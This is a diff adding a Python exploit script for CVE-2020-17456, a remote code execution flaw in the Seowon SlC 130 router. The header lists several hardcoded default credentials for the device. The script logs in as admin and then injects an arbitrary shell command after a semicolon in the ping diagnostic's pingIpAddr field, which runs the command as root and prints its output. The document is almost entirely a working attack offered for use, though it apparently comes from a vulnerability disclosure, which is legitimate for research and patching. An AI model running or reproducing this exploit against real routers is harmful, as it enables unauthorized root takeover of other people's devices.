@@ -1,0 +1,92 @@
+# Exploit Title: Seowon SlC 130 Router - Remote Code Execution
+# Author: maj0rmil4d - Ali Jalalat
+# Author website: https://secureguy.ir
+# Date: 2020-08-20
+# Vendor Homepage: seowonintech.co.kr
+# Software Link: http://www.seowonintech.co.kr/en/product/detail.asp?num=150&big_kind=B05&middle_kind=B05_29
+# CVE: CVE-2020-17456
+# Version: Lync:Mac firmware 1.0.1, likely earlier versions
+# Tested on: Windows 10 - Parrot sec
+
+# Description:
+# user can run arbitrary commands on the router as root ! 
+# as there are already some hardcoded credentials so there is an easy to trigger exploit
+
+# credentials : 
+# user => VIP
+# pwd => V!P83869000
+
+# user => Root
+# pwd => PWDd0N~WH*4G#DN
+
+# user => root
+# pwd => gksrmf28
+
+# user => admin
+# pwd => admin
+# 
+
+# A  write-up can be found at:
+# https://maj0rmil4d.github.io/Seowon-SlC-130-And-SLR-120S-Exploit/
+
+import requests
+import sys
+
+host = sys.argv[1]
+
+session = requests.Session()
+
+header = { 
+
+"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+"Accept": "text/html,application/xhtml+xml,application/xml;q:0.9,image/webp,*/*;q:0.8",
+"Accept-Language": "en-US,en;q:0.5",
+"Accept-Encoding": "gzip, deflate",
+"Content-Type": "pplication/x-www-form-urlencoded",
+"Content-Length": "132",
+"Origin": "http://192.168.1.1",
+"Connection": "close",
+"Referer": "http://192.168.1.1/",
+"Upgrade-Insecure-Requests": "1"
+}
+
+
+
+datas = {
+	
+	"Command":"Submit",
+	"expires":"Wed%2C+12+Aug+2020+15%3A20%3A05+GMT",
+	"browserTime":"081119502020",
+	"currentTime":"1597159205",
+	"user":"admin",
+	"password":"admin"
+}
+
+
+#auth
+
+session.post(host+"/cgi-bin/login.cgi" , headers=header , data = datas)
+
+#rce
+
+cmd = sys.argv[2]
+
+rce_data = {
+	
+	"Command":"Diagnostic",
+	"traceMode":"ping",
+	"reportIpOnly":"",
+	"pingIpAddr":";".encode("ISO-8859-1").decode()+cmd,
+	"pingPktSize":"56",
+	"pingTimeout":"30",
+	"pingCount":"4",
+	"maxTTLCnt":"30",
+	"queriesCnt":"3",
+	"reportIpOnlyCheckbox":"on",
+	"btnApply":"Apply",
+	"T":"1597160664082"
+}
+
+rce = session.post(host+"/cgi-bin/system_log.cgi" , headers=header , data = rce_data)
+
+print("one line out put of ur command => " + rce.text.split('!')[1].split('[')[2].split("\n")[0])
